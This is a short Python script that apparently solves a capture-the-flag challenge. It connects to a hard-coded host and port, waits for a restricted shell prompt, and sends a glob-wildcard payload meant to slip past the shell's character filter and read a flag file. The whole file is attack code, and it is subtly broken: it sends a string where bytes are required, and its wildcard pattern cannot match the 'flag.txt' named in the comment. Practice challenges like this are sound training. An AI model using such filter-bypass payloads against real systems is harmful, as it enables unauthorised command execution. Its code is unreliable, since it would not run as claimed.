import socket
import time

# Configuration
HOST = "94.237.123.126"
PORT = 34445

# Payload to read flag.txt using wildcard expansion
payload = "/???/??? ?????"

# Prompt to wait for before sending the payload
PROMPT = b"Broken@Shell$ "

def recv_until_prompt(s, prompt):
    buffer = b""
    while prompt not in buffer:
        data = s.recv(4096)
        if not data:
            break
        buffer += data
    return buffer

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print("[+] Connected to target")

        # Wait for the shell prompt
        print("[*] Waiting for prompt...")
        recv_until_prompt(s, PROMPT)

        # Send the payload
        print("[+] Sending payload...")
        s.sendall(payload)

        # Wait for response
        time.sleep(2)

        # Receive and print the response
        print("[*] Response:")
        while True:
            data = s.recv(4096)
            if not data:
                break
            print(data.decode('utf-8', errors='replace'))

except Exception as e:
    print(f"[-] Error: {e}")